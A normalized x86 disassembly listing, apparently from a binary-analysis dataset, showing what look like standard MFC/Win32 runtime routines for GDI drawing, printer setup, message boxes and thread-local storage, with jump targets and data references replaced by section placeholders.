lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_4105da
test eax eax
je r-xdata
push 0x1
pop esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
push eax
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_4105da
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_411799
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_411799
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
lea eax [ ebp - 0xc ]
push 0x3fc0
push eax
mov [ ebp - 0x8 ] 0xff
call sub_4117da
or esi eax
and [ ebp + 0x8 ] 0xc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
lea eax [ ebp - 0xc ]
push 0x40
push eax
mov [ ebp - 0x8 ] 0x10
call sub_4117da
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push 0x80
push eax
mov [ ebp - 0x8 ] 0x2
call sub_4117da
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_4117da
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_4117da
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
mov [ ebp - 0x8 ] 0x1
call sub_4117da
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push edi
push eax
mov [ ebp - 0x8 ] 0x40
call sub_4117da
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_4117da
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_4117da
or esi eax
mov eax 0x8000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_4117da
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_4117da
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_4117da
or esi eax
mov ecx [ ebp - 0x4 ]
mov edx 0x3fc0
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_4117da
or esi eax
mov eax esi
pop edi
and eax [ ebp + 0x8 ]
pop esi
pop ebx
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
or al 0x10
or esi 0x10
mov [ ecx + 0x18 ] eax
sub_411b1a
mov eax sub_413b9e
call sub_40d394
push ecx
push esi
mov esi ecx
push edi
push 0xa
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x10 ] esi
call sub_40e9d2
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x20 ]
push 0x4
mov ecx edi
call sub_40e9d2
push 0x0
push 0x7
mov ecx edi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_40ea15
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x44 ] eax
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_411b7f
mov eax sub_413ba8
call sub_40d394
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov esi ecx
jne r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_40eb46
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
lea ecx [ esi + 0x20 ]
push edi
call sub_40eb46
test eax eax
je r-xdata
push sub_412174
call sub_40ec85
mov ecx [ esi + 0x3c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
call sub_40f06d
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x40 ]
mov [ ecx + eax ] edi
add ecx eax
cmp [ esi + 0x44 ] 0x2
jne r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_40eb79
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_40ec85
mov eax [ esi + 0x40 ]
mov [ eax + ebx ] edi
add eax ebx
cmp [ esi + 0x44 ] 0x2
jne r-xdata
call sub_40e926
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_411c3e
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x20 ]
call sub_40ea5a
push edi
lea edi [ esi + 0x20 ]
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
and [ eax + 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_40ec0b
mov eax [ esi + 0x40 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x44 ] 0x2
jne r-xdata
pop edi
sub_411cee
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x1c ]
call [ SetWindowPos@IAT ]
jmp r-xdata
mov eax [ eax + 0x1c ]
pop ebp
retn 0x18
sub_411da0
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn 0x4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
mov eax [ esp + 0xc ]
lea ecx [ eax + 0x4 ]
call sub_40eb46
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x8c ]
sub_411ddd
push esi
push edi
mov edi [ GetSysColor@IAT ]
mov esi ecx
push 0xf
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
mov [ esi + 0x20 ] eax
pop edi
pop esi
retn
sub_411e21
push ebx
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
mov esi ecx
push 0xb
call edi
push 0xc
mov [ esi + 0x8 ] eax
call edi
cmp [ esi + 0x68 ] 0x0
mov [ esi + 0xc ] eax
je r-xdata
call sub_41359e
call sub_41356e
jmp r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx [ GetDeviceCaps@IAT ]
mov edi eax
push 0x58
push edi
call ebx
push 0x5a
push edi
mov [ esi + 0x18 ] eax
call ebx
push edi
push 0x0
mov [ esi + 0x1c ] eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
retn
sub_411e79
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi + 0x98 ]
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov ebx [ GlobalLock@IAT ]
push eax
call ebx
movzx ecx [ eax + 0x2 ]
push [ ebp + 0x8 ]
add ecx eax
push ecx
call [ lstrcmpA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push [ ebp + 0x8 ]
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ esi + 0x94 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
push eax
push 0x42
call [ GlobalAlloc@IAT ]
push eax
mov [ esi + 0x94 ] eax
call ebx
push 0x2
push edi
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push edi
call DocumentPropertiesA
cmp eax 0x1
je r-xdata
push eax
call sub_41213e
push [ ebp - 0x4 ]
call ClosePrinter
push [ esi + 0x94 ]
call sub_41213e
mov [ esi + 0x94 ] edi
sub_411f26
mov eax sub_413bf2
call sub_40d394
push esi
call sub_41314c
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_412174
call sub_40ec85
push 0x48
mov ebx eax
call sub_40ec97
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_411b1a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_40ec85
pop ebx
sub_411fcb
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_411f26
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_40ebc9
sub_41200e
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
and eax 0xf
cmp eax [ ebp + 0xc ]
je r-xdata
leave
retn 0x8
lea eax [ ebp - 0xc ]
push 0xa
push eax
push [ ebp + 0x8 ]
call [ GetClassNameA@IAT ]
lea eax [ ebp - 0xc ]
push r--data
push eax
call [ lstrcmpiA@IAT ]
neg eax
sbb eax eax
inc eax
sub_412058
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp + 0xc ]
push edi
push eax
push [ ebp + 0x8 ]
call [ ClientToScreen@IAT ]
mov edi [ GetWindow@IAT ]
push 0x5
push [ ebp + 0x8 ]
xor eax eax
push esi
call [ GetDlgCtrlID@IAT ]
cmp ax 0xffff
je r-xdata
push 0x2
push esi
jmp r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x10000000
je r-xdata
call edi
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
push [ ebp + 0x10 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
sub_4120cd
push ebp
mov ebp esp
sub esp 0x100
push esi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
mov esi eax
mov eax 0x100
cmp esi eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowTextA@IAT ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push [ ebp + 0x8 ]
call [ GetWindowTextA@IAT ]
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x100 ]
push eax
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
sub_41213e
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
pop edi
retn 0x4
push edi
call [ GlobalFlags@IAT ]
and eax 0xff
mov ecx eax
dec eax
test ecx ecx
je r-xdata
push edi
call [ GlobalFree@IAT ]
push esi
lea esi [ eax + 0x1 ]
push edi
call [ GlobalUnlock@IAT ]
dec esi
jne r-xdata
pop esi
sub_412174
push esi
call sub_412eef
mov esi eax
test esi esi
je r-xdata
call sub_40e926
xor eax eax
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call sub_40d472
pop ecx
mov ecx [ esp + 0x8 ]
lea edx [ ecx + 0x4 ]
cmp eax edx
ja r-xdata
sub eax ecx
sub eax 0x4
push eax
push [ esi + 0xc ]
call sub_40d4b7
pop ecx
pop ecx
push [ esi + 0xc ]
call sub_404e2a
and [ esi + 0xc ] 0x0
pop ecx
jmp r-xdata
push 0x1
pop eax
pop esi
retn
sub_4121f6
mov eax sub_413c2e
call sub_40d394
push esi
call sub_41314c
mov esi eax
cmp [ esi + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x1c ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_412174
call sub_40ec85
push 0x48
mov ebx eax
call sub_40ec97
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x2
push 0x4
push r--data
call sub_411b1a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x1c ] eax
call sub_40ec85
pop ebx
sub_41227d
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_4121f6
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_40ebc9
sub_4122ae
mov eax sub_413c40
call sub_40d394
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_41227d
push eax
call [ DeleteDC@IAT ]
sub_412302
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ SaveDC@IAT ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
push eax
call edi
mov ebx eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
push eax
call edi
test eax eax
je r-xdata
or ebx 0xffffffff
sub_412333
push esi
mov esi ecx
push edi
mov edi [ RestoreDC@IAT ]
mov ecx [ esi + 0x4 ]
push 0x1
cmp ecx [ esi + 0x8 ]
pop eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push esi
call edi
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
sub_412371
push ebx
push esi
push edi
mov esi ecx
push [ esp + 0x10 ]
call [ GetStockObject@IAT ]
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
mov ebx eax
xor eax eax
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push ebx
push ecx
call edi
push eax
call sub_4126e1
pop edi
pop esi
pop ebx
retn 0x4
push ebx
push esi
call edi
sub_4123ad
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SelectObject@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_4126e1
pop edi
pop esi
pop ebx
retn 0x4
test ebx ebx
jne r-xdata
push eax
push ecx
call edi
mov eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
xor eax eax
jmp r-xdata
push eax
push esi
call edi
sub_4123f3
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetBkColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_412422
push esi
mov esi ecx
or eax 0xffffffff
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetTextColor@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_412451
push esi
mov esi ecx
xor eax eax
push edi
mov ecx [ esi + 0x4 ]
mov edi [ SetMapMode@IAT ]
cmp ecx [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push [ esp + 0xc ]
push ecx
call edi
pop edi
pop esi
retn 0x4
push [ esp + 0xc ]
push esi
call edi
sub_41247f
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4124cb
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ OffsetViewportOrgEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_412517
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_412563
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleViewportExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_4125bb
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ SetWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0xc
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_412607
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
mov edi [ ScaleWindowExtEx@IAT ]
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call edi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x14
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call edi
sub_41266f
mov eax sub_413c56
call sub_40d394
push esi
call sub_41314c
mov esi eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x20 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_412174
call sub_40ec85
push 0x48
mov ebx eax
call sub_40ec97
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_411b1a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x20 ] eax
call sub_40ec85
pop ebx
sub_4126f6
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_41266f
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_40ebc9
sub_412736
push esi
call sub_40c91f
mov esi eax
test esi esi
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0xb0 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x68 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push [ esp + 0x8 ]
call [ eax + 0x64 ]
sub_412764
push ebp
mov ebp esp
sub esp 0x114
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
push ebx
mov [ ebp - 0x10 ] edi
call sub_412736
lea eax [ ebp - 0x4 ]
push eax
push ebx
call sub_4128dc
xor esi esi
cmp eax ebx
mov [ ebp - 0xc ] eax
je r-xdata
cmp edi ebx
je r-xdata
push ebx
push ebx
push 0x376
push [ ebp - 0x4 ]
call [ SendMessageA@IAT ]
cmp eax ebx
je r-xdata
cmp esi ebx
mov [ ebp - 0x8 ] ebx
je r-xdata
lea esi [ edi + 0x9c ]
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
test bl 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
cmp eax ebx
je r-xdata
test edi edi
je r-xdata
mov eax ebx
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea eax [ ebp - 0x114 ]
push 0x104
push eax
push 0x0
lea edi [ ebp - 0x114 ]
call [ GetModuleFileNameA@IAT ]
mov edi [ edi + 0x78 ]
jmp r-xdata
or ebx 0x30
cmp eax 0x2
jbe r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
push ebx
push edi
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call [ MessageBoxA@IAT ]
test esi esi
mov edi eax
je r-xdata
cmp eax 0x4
ja r-xdata
mov ecx [ ebp - 0x10 ]
push 0x1
call sub_412736
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0xc
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
sub_41284b
push ebp
mov ebp esp
call sub_413126
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
xor ecx ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412764
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x8c ]
jmp r-xdata
pop ebp
retn 0xc
sub_412883
mov eax sub_413a0c
call sub_40d394
push ecx
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_40f0b3
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
push esi
push eax
push [ ebp + 0xc ]
push [ ebp - 0x10 ]
call sub_41284b
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
mov esi eax
call sub_40ef78
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov eax [ ebp + 0x8 ]
sub_4128dc
push ebx
mov ebx [ GetParent@IAT ]
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
test ebp ebp
mov esi ebp
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
call sub_412978
test eax eax
jne r-xdata
test esi esi
mov edi esi
mov eax esi
je r-xdata
push esi
call ebx
mov esi eax
jmp r-xdata
mov esi [ eax + 0x1c ]
call sub_40c91f
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
je r-xdata
xor esi esi
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_412a04
mov eax sub_4139ed
call sub_40d394
push ecx
push 0x118
call sub_412a4b
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_412e49
sub_412a7d
push esi
mov esi ecx
xor eax eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
call sub_40e926
sub_412abf
push ecx
push ecx
push ebp
push esi
mov esi ecx
push edi
lea eax [ esi + 0x1c ]
push eax
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov ebp [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi ebp
jge r-xdata
push 0x1
pop edi
cmp ebp edi
